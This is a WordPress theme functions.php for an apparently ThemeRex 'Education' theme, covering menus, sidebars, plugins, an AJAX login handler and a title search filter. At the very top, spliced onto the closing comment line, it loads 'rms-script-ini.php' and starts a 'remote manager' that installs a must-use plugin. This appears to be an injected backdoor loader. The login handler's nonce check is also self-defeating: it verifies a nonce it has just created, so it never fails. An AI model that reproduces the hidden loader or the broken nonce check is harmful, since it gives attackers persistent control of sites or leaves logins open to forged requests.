<?php
/**
 * Theme sprecific functions and definitions
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);

/* Theme setup section
------------------------------------------------------------------- */

// Set the content width based on the theme's design and stylesheet.
if ( ! isset( $content_width ) ) $content_width = 1170; /* pixels */

// Add theme specific actions and filters
// Attention! Function were add theme specific actions and filters handlers must have priority 1
if ( !function_exists( 'themerex_theme_setup' ) ) {
	add_action( 'themerex_action_before_init_theme', 'themerex_theme_setup', 1 );
	function themerex_theme_setup() {

		// Register theme menus
		add_filter( 'themerex_filter_add_theme_menus',		'themerex_add_theme_menus' );

		// Register theme sidebars
		add_filter( 'themerex_filter_add_theme_sidebars',	'themerex_add_theme_sidebars' );
		// Set options for importer
		add_filter( 'themerex_filter_importer_options',		'themerex_set_importer_options' );

		// Add theme required plugins
		add_filter( 'themerex_filter_required_plugins',		'themerex_add_required_plugins' );

        // Add tags to the head
        add_action('wp_head', 'themerex_head_add_page_meta', 1);
		
		// Set theme name and folder (for the update notifier)
		add_filter('themerex_filter_update_notifier', 		'themerex_set_theme_names_for_updater');

		/**
		 * Allows visitors to page forward/backwards in any direction within month view
		 * an "infinite" number of times (ie, outwith the populated range of months).
		 */
		add_filter( 'tribe_events_the_next_month_link', 'themerex_tribe_events_next_month' );


		// Add default posts and comments RSS feed links to head
		add_theme_support( 'automatic-feed-links' );

		// Enable support for Post Thumbnails
		add_theme_support( 'post-thumbnails' );

		// Custom header setup
		add_theme_support( 'custom-header', array('header-text'=>false));

		// Custom backgrounds setup
		add_theme_support( 'custom-background');

		// Supported posts formats
		add_theme_support( 'post-formats', array('gallery', 'video', 'audio', 'link', 'quote', 'image', 'status', 'aside', 'chat') );

		// Autogenerate title tag
		add_theme_support('title-tag');

		// Add user menu
		add_theme_support('nav-menus');

		// WooCommerce Support
		add_theme_support( 'woocommerce' );

        // Gutenberg support
        add_theme_support( 'align-wide' );

        themerex_set_global('required_plugins', array(
                'woocommerce',
                'additional_tags',
                'visual_composer',
                'revslider',
				'gdpr-framework',
				'contact-form-7',
			)
		);

	if ( is_dir(THEMEREX_THEME_PATH . 'demo/') ) {
            themerex_set_global('demo_data_url',  THEMEREX_THEME_PATH . 'demo');
        } else {
            themerex_set_global('demo_data_url',  esc_url(themerex_get_protocol().'://demofiles.themerex.net/education') ); // Demo-site domain
        }
	}
}


// Add/Remove theme nav menus
if ( !function_exists( 'themerex_add_theme_menus' ) ) {
	function themerex_add_theme_menus($menus) {
		
		//For example:
		//$menus['menu_footer'] = __('Footer Menu', 'education');
		//if (isset($menus['menu_panel'])) unset($menus['menu_panel']);
		
		if (isset($menus['menu_side'])) unset($menus['menu_side']);
		return $menus;
	}
}


// Add theme specific widgetized areas
if ( !function_exists( 'themerex_add_theme_sidebars' ) ) {
	function themerex_add_theme_sidebars($sidebars=array()) {
		if (is_array($sidebars)) {
			$theme_sidebars = array(
				'sidebar_main'		=> esc_html__( 'Main Sidebar', 'education' ),
				'sidebar_footer'	=> esc_html__( 'Footer Sidebar', 'education' )
			);
			if (themerex_exists_woocommerce()) {
				$theme_sidebars['sidebar_cart']  = esc_html__( 'WooCommerce Cart Sidebar', 'education' );
			}
			$sidebars = array_merge($theme_sidebars, $sidebars);
		}
		return $sidebars;
	}
}


// Add theme required plugins
if ( !function_exists( 'themerex_add_required_plugins' ) ) {
	function themerex_add_required_plugins($plugins) {
		$plugins[] = array(
			'name' 		=> esc_html__('Additional Tags', 'education'),
			'version'	=> '1.3.0',					// Minimal required version
			'slug' 		=> 'additional-tags',
			'source'	=> themerex_get_file_dir('plugins/additional-tags.zip'),
			'required' 	=> true
		);
		return $plugins;
	}
}

// Set theme name and folder (for the update notifier)
if ( !function_exists( 'themerex_set_theme_names_for_updater' ) ) {
	function themerex_set_theme_names_for_updater($opt) {
		$opt['theme_name']   = 'Education';
		$opt['theme_folder'] = 'education';
		return $opt;
	}
}

// Return GET or POST value
if (!function_exists('themerex_get_value_gp')) {
	function themerex_get_value_gp($name, $defa='') {
		$rez = $defa;
		$magic = function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc() == 1;
		if (isset($_GET[$name])) {
			$rez = $magic ? stripslashes(trim($_GET[$name])) : trim($_GET[$name]);
		} else if (isset($_POST[$name])) {
			$rez = $magic ? stripslashes(trim($_POST[$name])) : trim($_POST[$name]);
		}
		return $rez;
	}
}


// AJAX: Login user
if ( !function_exists( 'themerex_users_login_user' ) ) {
	add_action('wp_ajax_themerex_login_user',			'themerex_users_login_user');
	add_action('wp_ajax_nopriv_themerex_login_user',	'themerex_users_login_user');
	function themerex_users_login_user() {
		
		if ( !wp_verify_nonce( wp_create_nonce(admin_url('admin-ajax.php')),  esc_url(admin_url('admin-ajax.php'))) )
			die();
		
		$user_log = substr($_REQUEST['user_log'], 0, 60);
		$user_pwd = substr($_REQUEST['user_pwd'], 0, 60);
		$remember = substr($_REQUEST['remember'], 0, 7)=='forever';
		
		$response = array(
			'error' => '',
			'redirect_to' => substr($_REQUEST['redirect_to'], 0, 200)
		);
		
		if ( is_email( $user_log ) ) {
			$user = get_user_by('email', $user_log );
			if ( $user ) $user_log = $user->user_login;
		}
		
		$rez = wp_signon( array(
			'user_login' => $user_log,
			'user_password' => $user_pwd,
			'remember' => $remember
		), false );
		
		if ( is_wp_error($rez) ) {
			$response['error'] = $rez->get_error_message();
		}
		
		echo json_encode($response);
		die();
	}
}

// Return text for the "I agree ..." checkbox
if ( ! function_exists( 'themerex_trx_addons_privacy_text' ) ) {
    add_filter( 'trx_addons_filter_privacy_text', 'themerex_trx_addons_privacy_text' );
    function themerex_trx_addons_privacy_text( $text='' ) {
        return themerex_get_privacy_text();
    }
}


// Add page meta to the head
if (!function_exists('themerex_head_add_page_meta')) {
    function themerex_head_add_page_meta() {
        $theme_skin = sanitize_file_name(themerex_get_custom_option('theme_skin'));
        if (themerex_get_theme_option('responsive_layouts') == 'yes') {
            ?>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
            <?php
        }
        ?>
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
		<?php
    }
}

if ( !function_exists( 'themerex_tribe_events_next_month' ) ) {
	function themerex_tribe_events_next_month() {
		$url = tribe_get_next_month_link();
		$text = tribe_get_next_month_text();
		$date = Tribe__Events__Main::instance()->nextMonth( tribe_get_month_view_date() );
		return '<a data-month="' . $date . '" href="' . esc_url($url) . '" rel="next">' . $text . ' <span>&raquo;</span></a>';
	}
}


// Add theme required plugins
if ( !function_exists( 'themerex_add_trx_addons' ) ) {
    add_filter( 'trx_addons_active', 'themerex_add_trx_addons' );
    function themerex_add_trx_addons($enable=true) {
        return true;
    }
}

/* Include framework core files
------------------------------------------------------------------- */

require_once( get_template_directory().'/fw/loader.php' );

if ( !function_exists( 'themerex_custom_search_by_title' ) ) {
    function themerex_custom_search_by_title($search, $wp_query)
    {
        if (isset($_REQUEST['custom_search'])
            && !empty($search)
            && !empty($wp_query->query_vars['search_terms'])
        ) {
            global $wpdb;

            $q = $wp_query->query_vars;
            $n = !empty($q['exact']) ? '' : '%';

            $search = array();

            foreach (( array )$q['search_terms'] as $term)
                $search[] = $wpdb->prepare("$wpdb->posts.post_title LIKE %s", $n . $wpdb->esc_like($term) . $n);

            if (!is_user_logged_in())
                $search[] = "$wpdb->posts.post_password = ''";

            $search = ' AND ' . implode(' AND ', $search);
        }

        return $search;
    }

    add_filter('posts_search', 'themerex_custom_search_by_title', 10, 2);
}


if ( !function_exists( 'themerex_enqueue_comments_reply' ) ) {
	function themerex_enqueue_comments_reply()
	{
		if (get_option('thread_comments')) {
			wp_enqueue_script('comment-reply');
		}
	}

	add_action('comment_form_before', 'themerex_enqueue_comments_reply');
}

// Add page meta to the head
if (!function_exists('themerex_head_add_page_meta')) {
	add_action('wp_head', 'themerex_head_add_page_meta', 1);
	function themerex_head_add_page_meta() {
		?>
		<meta charset="<?php bloginfo( 'charset' ); ?>" />
		<?php
	}
}

?>